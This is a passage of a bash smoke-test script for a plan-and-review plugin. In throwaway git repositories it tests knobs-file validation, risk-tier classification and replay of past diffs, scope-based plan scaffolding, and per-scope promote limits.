  sb="$(dirname "$(dirname "$w")")"; mkdir -p "$sb/knobs"; printf '%s\n' "$1" >"$sb/knobs/scope-loop.json"
  shift 2; while [ $# -ge 2 ]; do mkdir -p "$w/$(dirname "$1")"; printf '%s\n' "$2" >"$w/$1"; shift 2; done
  git -C "$w" add -A; git -C "$w" commit -qm t; (cd "$d" && "$EX/risk-tier.sh" plans/v-plan.md 1 2>&1) || true; echo "RTK_STATE: $(dirname "$w")"
}
O62="$(rtk '{"review": {"cap": 0}}' '[docs]' src/x.py x)"
has 'knobs file .*/knobs/scope-loop.json is invalid: review.cap: 0 is out of range' "$O62" && ! has '^TIER:' "$O62" || fail "risk-tier did not refuse an invalid knobs file (naming it): $O62"
has '^TIER: A' "$(rtc '[docs]' src/x.py 'frobnicate(1)')" || fail "the fixture for the extra term is not Tier A without knobs"
O62="$(rtk '{"tiers": {"c_terms_extra": ["frobnicate"]}}' '[docs]' src/x.py 'frobnicate(1)')"
has '^TIER: C' "$O62" && has "tier-c content signal in diff: 'frobnicate'" "$O62" && has '^KNOBS: [0-9a-f]\{12\}$' "$O62" || fail "an extra Tier C term from the knobs file did not raise Tier C: $O62"
python3 -c 'import json,sys; r=json.load(open(sys.argv[1]))["tiers"]["1"]; assert r["tier"]=="C" and len(r["knobs"])==12, r' "$(sed -n 's/^RTK_STATE: //p' <<<"$O62")/checkpoint.json" || fail "the tier record does not carry the knobs sha"
O62="$(rtk "$GOODK" '[docs]' plugins/x/agents/a.md 'Store the stripe secret')"
has '^TIER: A' "$O62" && has '^REASON: exempted by knobs: plugins/x/agents/a.md (plugins/\*/agents/\*.md: agent prompts name auth terms as prose)' "$O62" || fail "an exempt glob did not keep a shipped agent prompt out of Tier C: $O62"
has '^TIER: C' "$(rtk "$GOODK" '[docs]' plugins/x/agents/a.md 'Store the stripe secret' src/auth/s.py x)" || fail "an exempt glob hid another file's Tier C path"
has '^TIER: C' "$(rtk "$GOODK" '[docs][security]' plugins/x/agents/a.md 'x')" || fail "an exempt glob overrode a [security] tag"
has '^TIER: A' "$(rtc '[docs]' src/x.py "$(seq 1 40)")" || fail "the fixture for b_max_lines is not Tier A without knobs"
O62="$(rtk '{"tiers": {"b_max_lines": 20}}' '[docs]' src/x.py "$(seq 1 40)")"
has '^TIER: B' "$O62" && has 'diff size: 40 changed lines (>20)' "$O62" || fail "a lowered b_max_lines did not raise Tier B: $O62"
python3 -c 'import json,sys; r=json.load(open(sys.argv[1]))["tiers"]["1"]; assert r["knobs"] and r["tier"]=="B", r' "$(sed -n 's/^RTK_STATE: //p' <<<"$O62")/checkpoint.json" || fail "the Tier B record does not carry the knobs sha"
# review.cap from the file reaches the brief and checkpoint review; KNOBS in the brief; iterate refuses an invalid file.
T62="$SMOKE_TMP/t62"; TW="$(cal_run "$T62" "$TWO")" || fail "init for check 62 failed"
SB62="$(dirname "$(st "$T62" plans/v-plan.md)")"
has '^KNOBS: default$' "$(brief "$T62" plans/v-plan.md)" || fail "the brief does not print KNOBS: default without a knobs file"
mkdir -p "$SB62/knobs"; printf '{"review": {"cap": 1, "adversary_budget": 5}}\n' >"$SB62/knobs/scope-loop.json"
B62="$(brief "$T62" plans/v-plan.md)"
has '^REVIEW_CAP: 1 (blocking rounds per attempt)' "$B62" && has '^ADVERSARY_BUDGET: 5$' "$B62" && has '^KNOBS: [0-9a-f]\{12\}$' "$B62" || fail "the brief does not show the knobs file's review.cap / adversary_budget / KNOBS"
has '^ADVERSARY_BUDGET: 2$' "$( (cd "$T62" && APEX_ADVERSARY_BUDGET=2 "$EX/iterate.sh" plans/v-plan.md) 2>&1)" || fail "APEX_ADVERSARY_BUDGET did not win over the knobs file"
vc "$T62" review 1 "$(wcommit "$TW" k1 a.md)" REQUEST_CHANGES >/dev/null || fail "the first blocking round was refused"
expect_refusal "a second blocking round over review.cap=1 from the knobs file" "REVIEW_CAP: 1 review rounds requested changes" vc "$T62" review 1 "$(wcommit "$TW" k2 a.md)" REQUEST_CHANGES
printf '{"review": {"cap": 1}, "tiers": {"exempt": [{"glob": "**/*", "reason": "exempt the whole repository"}]}}\n' >"$SB62/knobs/scope-loop.json"
B62="$(brief "$T62" plans/v-plan.md)"
has '^STATUS: ERROR knobs file .*/knobs/scope-loop.json is invalid: tiers.exempt\[0\].glob' "$B62" && has '^__RC__: 1' "$B62" || fail "iterate did not refuse an invalid knobs file: $B62"
expect_refusal "checkpoint review with an invalid knobs file" "knobs file .* is invalid" vc "$T62" review 1 "$(git -C "$TW" rev-parse HEAD)" APPROVE
expect_refusal "checkpoint fail with an invalid knobs file" "knobs file .* is invalid" vc "$T62" fail 1 x
rm -f "$SB62/knobs/scope-loop.json"
ok "knobs file: one validator (keys, ranges, regexes, catch-all globs, reasons, schema); env > file > default; invalid file refused by risk-tier, iterate and checkpoint; extra terms, exempt globs, B thresholds, review.cap reach the classifier and the loop; KNOBS recorded and printed"

# 63. Replay (v0.6.0, apex-console's tier simulator): risk-tier.sh --no-record --since S --head H
#     classifies a past task's committed diff S..H (not the current head, nothing uncommitted);
#     --knobs FILE classifies it under a proposed knobs file; both refuse without --no-record;
#     an invalid proposal exits 3; nothing is recorded and no knobs file is written.
R63="$SMOKE_TMP/r63"; W63="$(cal_run "$R63" "- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n")" || fail "init for check 63 failed"
S63="$(git -C "$W63" rev-parse HEAD)"
mkdir -p "$W63/plugins/x/agents" "$W63/src/auth"; printf 'Store the stripe secret\n' >"$W63/plugins/x/agents/a.md"
git -C "$W63" add -A; git -C "$W63" commit -qm past; H63="$(git -C "$W63" rev-parse HEAD)"
printf 'x\n' >"$W63/src/auth/s.py"; git -C "$W63" add -A; git -C "$W63" commit -qm later    # after the past task
printf 'uncommitted\n' >"$W63/src/auth/u.py"
CP63="$(dirname "$W63")/checkpoint.json"; SUM63="$(cksum <"$CP63")"; SB63="$(dirname "$(dirname "$W63")")"
O63="$(cd "$R63" && "$EX/risk-tier.sh" plans/v-plan.md 1 --no-record --since "$S63" --head "$H63" 2>&1)" || fail "a replay failed: $O63"
has '^TIER: C' "$O63" && has "^REASON: tier-c content signal in diff: 'stripe' (plugins/x/agents/a.md)" "$O63" && ! has 'src/auth' "$O63" && has "^HEAD: $H63" "$O63" \
  || fail "a replay did not classify exactly the past diff S..H: $O63"
printf '{"schema": 1, "tiers": {"exempt": [{"glob": "plugins/*/agents/*.md", "reason": "agent prompts name auth terms as prose"}]}}\n' >"$SMOKE_TMP/prop63.json"
O63="$(cd "$R63" && "$EX/risk-tier.sh" plans/v-plan.md 1 --no-record --since "$S63" --head "$H63" --knobs "$SMOKE_TMP/prop63.json" 2>&1)" || fail "a replay under proposed knobs failed: $O63"
has '^TIER: A' "$O63" && has '^REASON: exempted by knobs: plugins/x/agents/a.md' "$O63" && has '^KNOBS: [0-9a-f]\{12\}$' "$O63" \
  || fail "a replay under a proposed exemption did not lower the tier: $O63"
expect_refusal "--head without --no-record" "they need --no-record" bash -c 'cd "$1" && "$2/risk-tier.sh" plans/v-plan.md 1 --since "$3" --head "$4"' _ "$R63" "$EX" "$S63" "$H63"
expect_refusal "--knobs without --no-record" "they need --no-record" bash -c 'cd "$1" && "$2/risk-tier.sh" plans/v-plan.md 1 --knobs "$3"' _ "$R63" "$EX" "$SMOKE_TMP/prop63.json"
expect_refusal "--head without --since" "--head needs --since" bash -c 'cd "$1" && "$2/risk-tier.sh" plans/v-plan.md 1 --no-record --head "$3"' _ "$R63" "$EX" "$H63"
printf '{"schema": 1, "tiers": {"exempt": [{"glob": "*/*", "reason": "almost everything is fine"}]}}\n' >"$SMOKE_TMP/bad63.json"
RC63=0; O63="$(cd "$R63" && "$EX/risk-tier.sh" plans/v-plan.md 1 --no-record --since "$S63" --head "$H63" --knobs "$SMOKE_TMP/bad63.json" 2>&1)" || RC63=$?
[ "$RC63" = 3 ] && has 'the proposed knobs file is invalid: .*names no directory' "$O63" || fail "an invalid proposed knobs file was not refused (rc=$RC63): $O63"
[ "$(cksum <"$CP63")" = "$SUM63" ] && [ ! -e "$SB63/knobs/scope-loop.json" ] || fail "a replay recorded a tier or wrote a knobs file"
ok "replay: --no-record --since S --head H classifies exactly a past diff; --knobs replays it under a proposal; both need --no-record; an invalid proposal exits 3; nothing recorded"

# 64. existing-plans-baseline (Phase 1.1): the two plans with no Scope line today,
#     apex-dispatch-plan.md and novel-plugins-suite-plan.md, keep validating, counting
#     and promoting exactly as recorded in scripts/fixtures/existing-plans/. Later
#     phases add a Scope: line (bugfix/poc/feature); a change that alters these outputs
#     turns this check red. "Promote dry-run" is defined here as: promote-to-loop.sh run
#     for real inside a throwaway fixture repository under $SMOKE_TMP, built the way check
#     29 builds its repository (git init, the fixture plan under .claude/plans/, a minimal
#     ADR stub with **Status**: Accepted under .claude/tasks/). promote-to-loop.sh has no
#     dry-run flag, so the throwaway repository is the sandbox; the real checkout's git
#     status must be identical before and after. Output is normalised before comparison:
#     temp and checkout paths, 12+ digit hex hashes, ISO timestamps, and the Route dry-run
#     line (it depends on whether apex-dispatch is installed beside this plugin). Both
#     plans are fully checked off today, so promote refuses them at the "no unchecked
#     tasks" gate; that refusal (exit 1, recorded output) is the baseline.
EB_EPD="$PLUGIN_ROOT/scripts/fixtures/existing-plans"
EB_ROOT="$(git -C "$PLUGIN_ROOT" rev-parse --show-toplevel)"
EB_STATUS="$(git -C "$EB_ROOT" status --porcelain)"
# same_as_recorded FILE ACTUAL LABEL: ACTUAL must equal the recorded FILE byte for byte.
same_as_recorded() {
  local out
  out="$(diff -u "$1" "$2" 2>&1)" || fail "existing-plans-baseline: $3 differs from $(basename "$1"): $(printf '%s' "$out" | head -30)"
}
for EB_NAME in apex-dispatch novel-plugins-suite; do
  EB_PLAN="$EB_EPD/$EB_NAME-plan.md"; EB_REC="$EB_EPD/$EB_NAME"
  [ -f "$EB_PLAN" ] || fail "existing-plans-baseline: fixture $EB_NAME-plan.md is missing"
  EB_V="$(python3 "$EX/planlib.py" validate "$EB_PLAN" 2>&1)" || fail "existing-plans-baseline: $EB_NAME no longer validates: $EB_V"
  [ -z "$EB_V" ] || fail "existing-plans-baseline: $EB_NAME validate printed output: $EB_V"
  same_as_recorded "$EB_REC.validate.txt" /dev/null "validate output for $EB_NAME"
  python3 "$EX/planlib.py" counts "$EB_PLAN" >"$SMOKE_TMP/$EB_NAME.counts" 2>&1 || fail "existing-plans-baseline: planlib counts failed on $EB_NAME"
  same_as_recorded "$EB_REC.counts.txt" "$SMOKE_TMP/$EB_NAME.counts" "planlib counts for $EB_NAME"
  python3 "$EX/planlib.py" remaining "$EB_PLAN" >"$SMOKE_TMP/$EB_NAME.remaining" 2>&1 || fail "existing-plans-baseline: planlib remaining failed on $EB_NAME"
  same_as_recorded "$EB_REC.remaining.txt" "$SMOKE_TMP/$EB_NAME.remaining" "planlib remaining for $EB_NAME"
  EB_PR="$SMOKE_TMP/existing-$EB_NAME"; mkdir -p "$EB_PR/.claude/tasks" "$EB_PR/.claude/plans"; git init -q -b main "$EB_PR"
  printf '# ADR\n**Status**: Accepted\n' >"$EB_PR/.claude/tasks/$EB_NAME-adr.md"
  cp "$EB_PLAN" "$EB_PR/.claude/plans/$EB_NAME-plan.md"
  git -C "$EB_PR" add -A; git -C "$EB_PR" commit -qm "$EB_NAME baseline"
  EB_RC=0; EB_OUT="$(cd "$EB_PR" && APEX_DISPATCH_MODE= APEX_GIBSON=0 APEX_MEMORY_CMD= "$PLUGIN_ROOT/skills/apex-plan/scripts/promote-to-loop.sh" "$EB_NAME" 2>&1)" || EB_RC=$?
  [ "$EB_RC" = 1 ] || fail "existing-plans-baseline: promote-to-loop.sh exited $EB_RC for $EB_NAME (baseline is 1): $EB_OUT"
  EB_REAL_PR="$(cd "$EB_PR" && pwd -P)"
  printf '%s\n' "$EB_OUT" | sed -e "s#$EB_REAL_PR#<FIXTURE>#g" -e "s#$EB_PR#<FIXTURE>#g" -e "s#$EB_ROOT#<CHECKOUT>#g" -e "s#$SMOKE_TMP#<SMOKE_TMP>#g" \
    -e 's/[0-9a-f]\{12,\}/<HASH>/g' -e 's/[0-9]\{4\}-[0-9][0-9]-[0-9][0-9][T ][0-9:.]*Z\{0,1\}/<TIMESTAMP>/g' \
    -e 's/^Route dry-run: .*/Route dry-run: <ROUTE>/' >"$SMOKE_TMP/$EB_NAME.promote-dry-run.txt"
  same_as_recorded "$EB_REC.promote-dry-run.txt" "$SMOKE_TMP/$EB_NAME.promote-dry-run.txt" "promote dry-run output for $EB_NAME"
  [ -z "$(git -C "$EB_PR" status --porcelain)" ] && [ ! -e "$EB_PR/.dev-plan-state" ] || fail "existing-plans-baseline: the promote dry-run wrote into its fixture repository ($EB_NAME)"
done
[ "$(git -C "$EB_ROOT" status --porcelain)" = "$EB_STATUS" ] || fail "existing-plans-baseline: the promote dry-runs changed the checkout's git status"
ok "existing-plans-baseline: both plans without a Scope line validate, count and remain as recorded; promote-to-loop.sh refuses them today at the no-unchecked-tasks gate (exit 1, recorded output); the checkout is unchanged"

# 65. scope-start: start.sh --scope bugfix|poc|feature writes the Scope lines and picks the matching template.
#     No flag means feature (written explicitly). An unknown scope is rejected and writes nothing, in
#     several argument orders (the adversarial neighbour: a bad value next to --force). The generic and
#     apex lean templates have the same section headings, and every scaffolded plan passes planlib validate
#     and promote-to-loop.sh's gate-shape check for its human and partner gates (its check 8, extracted
#     and run as is: a gate that promote would refuse is a scaffold nobody can promote).
SS="$PLUGIN_ROOT/skills/apex-plan/scripts/start.sh"; SS_TMP="$SMOKE_TMP/scope-start"; SS_TPL="$PLUGIN_ROOT/skills/apex-plan/resources/templates/profiles"
mkdir -p "$SS_TMP" || fail "scope-start: cannot create the temp dir"
# promote-to-loop.sh check 8 is the python block between its "<<'PY'" line and the closing PY; run it unchanged
SS_PROMOTE="$PLUGIN_ROOT/skills/apex-plan/scripts/promote-to-loop.sh"
SS_GATE_PY="$(sed -n "/<<'PY' || fail \"Gate task/,/^PY\$/p" "$SS_PROMOTE" | sed '1d;$d')"
[[ "$SS_GATE_PY" == *"should require approval phrase"* ]] || fail "scope-start: cannot extract promote-to-loop.sh's gate-shape check"
for SS_PROF in generic apex; do
  SS_R="$SS_TMP/$SS_PROF"; mkdir -p "$SS_R" && git -C "$SS_R" init -q -b main || fail "scope-start: cannot init the temp repo"
  for SS_SC in bugfix poc feature; do
    (cd "$SS_R" && APEX_PLAN_PROFILE="$SS_PROF" bash "$SS" "s-$SS_SC" "T" --scope "$SS_SC" >/dev/null) || fail "scope-start: $SS_PROF --scope $SS_SC failed"
    grep -qx "\*\*Scope\*\*: $SS_SC" "$SS_R/.claude/tasks/s-$SS_SC-adr.md" || fail "scope-start: $SS_PROF $SS_SC ADR has no **Scope**: line"
    grep -qx "> \*\*Scope\*\*: $SS_SC" "$SS_R/.claude/plans/s-$SS_SC-plan.md" || fail "scope-start: $SS_PROF $SS_SC plan has no > **Scope**: line"
    # the full ADR template carries a literal {{algorithm_name}} sample today; only the known placeholders must be gone
    ! grep -qE '\{\{(SLUG|TITLE|SCOPE|DATE|NNNN|[A-Z_]*EMAIL|TARGET_DATE|GOAL_ONE_SENTENCE|BOUNDED_CONTEXTS)\}\}' "$SS_R/.claude/tasks/s-$SS_SC-adr.md" "$SS_R/.claude/plans/s-$SS_SC-plan.md" || fail "scope-start: $SS_PROF $SS_SC left an unsubstituted placeholder"
    python3 "$EX/planlib.py" validate "$SS_R/.claude/plans/s-$SS_SC-plan.md" >/dev/null 2>&1 || fail "scope-start: $SS_PROF $SS_SC plan does not pass planlib validate"
    # [gate:auto] lines are left out: the lean "{test command}" and the full template's prose Gate 4->5 are
    # placeholders the author replaces before promoting; the human and partner gates must pass untouched
    SS_GOUT="$(python3 -c "$SS_GATE_PY" "$EX" "$SS_R/.claude/plans/s-$SS_SC-plan.md" 2>&1 || true)"
    SS_GBAD="$(grep '^  line ' <<<"$SS_GOUT" | grep -v '\[gate:auto\]' || true)"
    [ -z "$SS_GBAD" ] || fail "scope-start: $SS_PROF $SS_SC plan has a gate promote-to-loop.sh would refuse: $SS_GBAD"
    # and the human ship gate itself, stated directly (here-string, not a pipe into grep -q: L-003)
    SS_SHIP="$(grep -A1 '\[gate:human\]' "$SS_R/.claude/plans/s-$SS_SC-plan.md" | grep 'Acceptance:')"
    [ -n "$SS_SHIP" ] || fail "scope-start: $SS_PROF $SS_SC plan has no [gate:human] Acceptance"
    while IFS= read -r SS_LINE; do
      grep -qiE 'approve|user types' <<<"$SS_LINE" || fail "scope-start: $SS_PROF $SS_SC [gate:human] Acceptance has neither 'approve' nor 'user types': $SS_LINE"
    done <<<"$SS_SHIP"
  done
  # lean means lean: no Pseudocode, Architecture, Data Model or API sections; feature keeps them
  SS_L="$(cat "$SS_R/.claude/tasks/s-bugfix-adr.md" "$SS_R/.claude/tasks/s-poc-adr.md")"
  ! grep -qE '^#+ (Pseudocode|Architecture|Data Model|API Surface)' <<<"$SS_L" || fail "scope-start: $SS_PROF lean ADR still has a full-template section"
  grep -qE '^### Pseudocode' "$SS_R/.claude/tasks/s-feature-adr.md" || fail "scope-start: $SS_PROF feature ADR lost its Pseudocode section"
  [ "$(grep -c '^- \[ \] \*\*Phase' "$SS_R/.claude/plans/s-bugfix-plan.md")" -le 2 ] || fail "scope-start: $SS_PROF lean plan scaffolds more than 2 phase tasks"
  # no flag = feature: identical to --scope feature apart from the slug and the ADR number on line 1
  (cd "$SS_R" && APEX_PLAN_PROFILE="$SS_PROF" bash "$SS" "s-none" "T" >/dev/null) || fail "scope-start: $SS_PROF start.sh without --scope failed"
  [ "$(sed 's/s-none/s-feature/g;1d' "$SS_R/.claude/tasks/s-none-adr.md")" = "$(sed 1d "$SS_R/.claude/tasks/s-feature-adr.md")" ] || fail "scope-start: $SS_PROF no-flag ADR differs from --scope feature"
  [ "$(sed 's/s-none/s-feature/g' "$SS_R/.claude/plans/s-none-plan.md")" = "$(cat "$SS_R/.claude/plans/s-feature-plan.md")" ] || fail "scope-start: $SS_PROF no-flag plan differs from --scope feature"
  grep -qx '\*\*Scope\*\*: feature' "$SS_R/.claude/tasks/s-none-adr.md" && grep -qx '> \*\*Scope\*\*: feature' "$SS_R/.claude/plans/s-none-plan.md" || fail "scope-start: $SS_PROF no flag did not write Scope: feature"
  # unknown scope: non-zero, a clear message, nothing written
  for SS_BAD in "--scope epic" "--force --scope epic" "--scope epic --force" "--scope="; do
    SS_B="$SS_TMP/bad-$SS_PROF"; rm -rf "${SS_B:?}"; mkdir -p "$SS_B" && git -C "$SS_B" init -q -b main || fail "scope-start: cannot init the bad-scope repo"
    # shellcheck disable=SC2086
    SS_OUT="$(cd "$SS_B" && APEX_PLAN_PROFILE="$SS_PROF" bash "$SS" s-bad "T" $SS_BAD 2>&1)" && fail "scope-start: '$SS_BAD' was accepted"
    has 'unknown scope' "$SS_OUT" || fail "scope-start: '$SS_BAD' gave no clear message: $SS_OUT"
    [ -z "$(find "$SS_B" -path "$SS_B/.git" -prune -o -type f -print)" ] || fail "scope-start: '$SS_BAD' wrote files"
  done
done
SS_G="$(grep -h '^#' "$SS_TPL/generic/adr-template-lean.md" "$SS_TPL/generic/plan-template-lean.md")"
SS_A="$(grep -h '^#' "$SS_TPL/apex/adr-template-lean.md" "$SS_TPL/apex/plan-template-lean.md")"
[ -n "$SS_G" ] && [ "$SS_G" = "$SS_A" ] || fail "scope-start: generic and apex lean templates have different section headings"
ok "scope-start: --scope bugfix|poc|feature writes **Scope**: and > **Scope**: lines and picks the lean or full template in both profiles; no flag is feature; an unknown scope (alone, with --force, empty) is refused and writes nothing; lean headings match across profiles; every scaffolded plan validates and its human and partner gates pass promote's gate-shape check"

# 66. scope-promote (Phase 1.3): promote-to-loop.sh applies per-scope validation (ADR R2).
#     Fixtures are built with start.sh --scope in throwaway repositories under $SMOKE_TMP (as checks 29
#     and 64 do) with the ADR's TODOs filled and its status Accepted; a promote that succeeds runs
#     init.sh inside the fixture, so its worktree and state stay under $SMOKE_TMP (asserted below).
#     Definition of phase: a distinct major N among the plan's "Phase N.M" task ids. Expectations:
#       2-phase bugfix -> promotes (exit 0, "Scope: bugfix")         3-phase bugfix -> exit 1, "bugfix allows at most 2 phases; this plan has 3"
#       3-phase poc -> promotes; 4-phase poc -> exit 1               bugfix with a [tier:c] task -> promotes AND prints a WARNING that scope does not loosen enforcement
#       no Scope line anywhere -> byte-identical to the previous promote-to-loop.sh (git show 210da67), success and refusal
#     Adversarial neighbours, each exit 1 naming the problem, nothing initialised:
#       Scope only in the plan, or only in the ADR -> "declared in the ... but not in the ..."
#       ADR bugfix / plan poc -> "Scope disagrees"            unknown value, empty value, leftover {{SCOPE}}, wrong case -> unknown/malformed (never silently feature)
#       Scope declared twice -> refused
#     A bugfix ADR that still has Pseudocode/Architecture/Data Model/API sections promotes (promote never required them,
#     so no scope forbids them); a feature plan with 5 phases promotes (no limit).
#     Enforcement is not loosened: a bugfix plan with an ambiguous gate Acceptance, a Proposed ADR, a leftover TODO
#     and a task with no Acceptance are refused exactly as for feature.
SP_START="$PLUGIN_ROOT/skills/apex-plan/scripts/start.sh"; SP_PROMOTE="$PLUGIN_ROOT/skills/apex-plan/scripts/promote-to-loop.sh"
SP_TMP="$SMOKE_TMP/scope-promote"; mkdir -p "$SP_TMP" || fail "scope-promote: cannot create the temp dir"
SP_OLD="$SP_TMP/promote-to-loop.210da67.sh"
git -C "$EB_ROOT" show "210da67:plugins/apex-scope-loop/skills/apex-plan/scripts/promote-to-loop.sh" >"$SP_OLD" || fail "scope-promote: cannot read promote-to-loop.sh at 210da67"
[ -s "$SP_OLD" ] || fail "scope-promote: the 210da67 promote-to-loop.sh is empty"
# sp_ed FILE SED-ARGS...: edit a fixture file in place (portable -i) and fail if the file is not there
sp_ed() { local f="$1"; shift; [ -f "$f" ] || fail "scope-promote: no such fixture file $f"; sed -i.bak "$@" "$f" && rm -f "$f.bak"; }
# sp_fx NAME SCOPE [EXTRA_PHASES]: a committed repo with a filled-in, Accepted ADR and a plan from start.sh --scope SCOPE
# (SCOPE "none" = no Scope line in either file, like a plan from before Phase 1.2); EXTRA_PHASES adds Phase 3.1, 4.1, ...
sp_fx() {
  local d="$SP_TMP/$1" n
  [ -n "$1" ] && rm -rf "${d:?}"; mkdir -p "$d" && git -C "$d" init -q -b main || fail "scope-promote: cannot init $1"
  # feature and none are built from the lean (bugfix) scaffold and then re-labelled: the full feature template carries
  # placeholder Acceptance lines that promote's gate check rightly refuses, which is not what this check is about
  local lean="$2"; case "$2" in feature|none) lean=bugfix;; esac
  (cd "$d" && bash "$SP_START" fx T --scope "$lean" >/dev/null) || fail "scope-promote: start.sh failed for $1"
  sp_ed "$d/.claude/tasks/fx-adr.md" -e 's/\[ TODO[^]]*\]/filled/g' -e 's/_(filled in during refinement)_/keep it small/' -e 's/^\*\*Status\*\*: Proposed/**Status**: Accepted/'
  sp_ed "$d/.claude/plans/fx-plan.md" -e 's/{test command}/bash -c true/g'
  if [ "$2" = none ]; then sp_ed "$d/.claude/tasks/fx-adr.md" -e '/^\*\*Scope\*\*:/d'; sp_ed "$d/.claude/plans/fx-plan.md" -e '/^> \*\*Scope\*\*:/d'; fi
  if [ "$2" = feature ]; then sp_ed "$d/.claude/tasks/fx-adr.md" -e 's/^\*\*Scope\*\*: bugfix/**Scope**: feature/'; sp_ed "$d/.claude/plans/fx-plan.md" -e 's/^> \*\*Scope\*\*: bugfix/> **Scope**: feature/'; fi
  n=3; while [ "$n" -le $((2 + ${3:-0})) ]; do printf '\n- [ ] **Phase %s.1** [docs] extra phase %s\n  - Acceptance: true\n' "$n" "$n" >>"$d/.claude/plans/fx-plan.md"; n=$((n + 1)); done
  # SP_DATE (optional) pins the commit's author and committer date, so a caller can give two otherwise identical fixtures different commit ids
  ( [ -z "${SP_DATE:-}" ] || export GIT_AUTHOR_DATE="$SP_DATE" GIT_COMMITTER_DATE="$SP_DATE"; git -C "$d" add -A && git -C "$d" commit -qm fx ) || fail "scope-promote: cannot commit $1"
}
# sp_run SCRIPT DIR: run a promote in DIR; sets SP_RC and SP_OUT (stdout+stderr)
sp_run() { SP_RC=0; SP_OUT="$(cd "$2" && APEX_EXECUTE_SCRIPTS="$EX" APEX_DISPATCH_MODE= APEX_GIBSON=0 APEX_MEMORY_CMD= bash "$1" fx 2>&1)" || SP_RC=$?; }
# sp_refused NAME DIR PATTERN: exit 1, output matches PATTERN, no state or worktree was created
sp_refused() {
  sp_run "$SP_PROMOTE" "$2"
  [ "$SP_RC" = 1 ] || fail "scope-promote: $1 exited $SP_RC, expected 1: $SP_OUT"
  grep -qE -- "$3" <<<"$SP_OUT" || fail "scope-promote: $1 did not say '$3': $SP_OUT"
  [ ! -e "$2/.dev-plan-state" ] || fail "scope-promote: $1 left state behind"
}
sp_promoted() {
  sp_run "$SP_PROMOTE" "$2"
  [ "$SP_RC" = 0 ] || fail "scope-promote: $1 exited $SP_RC, expected 0: $SP_OUT"
  grep -qF -- "Validation passed." <<<"$SP_OUT" || fail "scope-promote: $1 did not report 'Validation passed.': $SP_OUT"
  [ -d "$2/.dev-plan-state" ] || fail "scope-promote: $1 promoted but wrote no state in its fixture"
}
# sp_edc NAME FILE SED-ARGS...: edit one fixture file of NAME and commit it
sp_edc() { local n="$1" f="$2"; shift 2; sp_ed "$SP_TMP/$n/$f" "$@"; git -C "$SP_TMP/$n" commit -qam edit || fail "scope-promote: cannot commit the edit to $n"; }
SP_ADR=.claude/tasks/fx-adr.md; SP_PLAN=.claude/plans/fx-plan.md
# (a) 2-phase bugfix promotes; poc with 3 phases promotes
sp_fx bf2 bugfix; sp_promoted "a 2-phase bugfix" "$SP_TMP/bf2"
grep -qF -- "Scope: bugfix (2 of at most 2 phases)" <<<"$SP_OUT" || fail "scope-promote: the 2-phase bugfix did not report its scope: $SP_OUT"
! grep -qF -- "WARNING" <<<"$SP_OUT" || fail "scope-promote: a bugfix without a [tier:c] task printed a warning: $SP_OUT"
sp_fx poc3 poc 1; sp_promoted "a 3-phase poc" "$SP_TMP/poc3"
# (b) 3-phase bugfix: exit 1, names the limit
sp_fx bf3 bugfix 1; sp_refused "a 3-phase bugfix" "$SP_TMP/bf3" "bugfix allows at most 2 phases; this plan has 3"
# (c) 4-phase poc
sp_fx poc4 poc 2; sp_refused "a 4-phase poc" "$SP_TMP/poc4" "poc allows at most 3 phases; this plan has 4"
# feature has no limit
sp_fx ft5 feature 3; sp_promoted "a 5-phase feature" "$SP_TMP/ft5"
# (d) [tier:c] under bugfix and poc still promotes and warns; under feature there is no warning
for SP_SC in bugfix poc; do
  sp_fx "tc-$SP_SC" "$SP_SC"; sp_edc "tc-$SP_SC" "$SP_PLAN" 's/^- \[ \] \*\*Phase 1\.1\*\* /&[tier:c] /'
  grep -qF '[tier:c]' "$SP_TMP/tc-$SP_SC/$SP_PLAN" || fail "scope-promote: could not tag the $SP_SC fixture [tier:c]"
  sp_promoted "a $SP_SC plan with a [tier:c] task" "$SP_TMP/tc-$SP_SC"
  grep -qF "WARNING: line" <<<"$SP_OUT" && grep -qF "does not loosen enforcement" <<<"$SP_OUT" || fail "scope-promote: $SP_SC with [tier:c] printed no warning that scope does not loosen enforcement: $SP_OUT"
done
sp_fx tc-ft feature; sp_edc tc-ft "$SP_PLAN" 's/^- \[ \] \*\*Phase 1\.1\*\* /&[tier:c] /'
sp_promoted "a feature plan with a [tier:c] task" "$SP_TMP/tc-ft"; ! grep -qF "WARNING" <<<"$SP_OUT" || fail "scope-promote: feature printed a [tier:c] warning: $SP_OUT"
# (e) no Scope line anywhere: identical to the previous script, on success and on refusal
# sp_norm DIR: hide what legitimately differs between two fixtures: paths, timestamps, 12+ hex runs, and the short commit id git
# prints (7+ hex) in "HEAD is now at <sha> fx" (init.sh's worktree) and in "[branch <sha>] msg"; anchored on those git phrases so
# that ordinary words and numbers are never blanked. (BSD sed: no \b, no \|.)
sp_norm() { local d; d="$(cd "$1" && pwd -P)"; sed -e "s#$d#<F>#g" -e "s#$1#<F>#g" -e "s#$SMOKE_TMP#<T>#g" \
  -e 's/\(HEAD is now at \)[0-9a-f]\{7,\}/\1<H>/' -e 's/^\(\[[^]]* \)[0-9a-f]\{7,\}\]/\1<H>]/' \
  -e 's/[0-9a-f]\{12,\}/<H>/g' -e 's/[0-9]\{4\}-[0-9][0-9]-[0-9][0-9][T ][0-9:.]*Z\{0,1\}/<TS>/g'; }
# The two fixtures have the same tree, author and committer, so their commit ids are equal only when both commits land in the same
# second; init.sh prints a short id ("HEAD is now at <sha> fx"), so without a pinned date this comparison would pass or fail by
# timing. Pin different dates so the ids always differ: sp_norm must then hide them, every run, or this check goes red.
SP_DATE="2001-01-01T00:00:00Z" sp_fx old-a none 4; SP_DATE="2002-02-02T00:00:00Z" sp_fx new-a none 4
[ "$(git -C "$SP_TMP/old-a" rev-parse --short HEAD)" != "$(git -C "$SP_TMP/new-a" rev-parse --short HEAD)" ] || fail "scope-promote: the old-a and new-a fixtures have the same commit id; the pinned dates did not take"
sp_run "$SP_OLD" "$SP_TMP/old-a"; SP_O_RC="$SP_RC"; SP_O_OUT="$(printf '%s\n' "$SP_OUT" | sp_norm "$SP_TMP/old-a")"
sp_run "$SP_PROMOTE" "$SP_TMP/new-a"; SP_N_RC="$SP_RC"; SP_N_OUT="$(printf '%s\n' "$SP_OUT" | sp_norm "$SP_TMP/new-a")"
# sp_norm hides a short commit id in git's phrases and nothing else: ordinary words and numbers of 7 or more hex-looking characters survive
[ "$(printf 'HEAD is now at 4027dca fx\n[main (root-commit) 10e081c] fx\n' | sp_norm "$SP_TMP/old-a")" = "$(printf 'HEAD is now at <H> fx\n[main (root-commit) <H>] fx\n')" ] \
